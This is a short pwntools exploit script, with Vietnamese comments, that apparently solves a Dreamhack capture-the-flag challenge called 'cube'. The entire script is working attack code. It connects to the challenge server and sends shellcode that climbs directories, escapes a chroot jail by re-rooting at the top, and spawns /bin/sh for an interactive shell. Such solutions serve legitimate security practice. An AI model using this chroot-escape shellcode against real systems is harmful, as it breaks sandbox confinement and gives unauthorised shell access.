#!/usr/bin/env python3
from pwn import *
context(arch='amd64', os='linux')
#p = process("./cube")
p = remote("host1.dreamhack.games", 12193)
e = ELF('./cube', checksec=False)

# Xây shellcode:
# 1. chdir lên cao nhất
# 2. chroot vào hiện tại (lúc này là /)
# 3. execve("/bin/sh")
shellcode = shellcraft.chdir("../../../..")
shellcode += shellcraft.chroot(".")
shellcode += shellcraft.execve("/bin/sh", 0, 0)
payload = asm(shellcode)

p.sendlineafter("Give me shellcode: ", payload)
p.interactive()


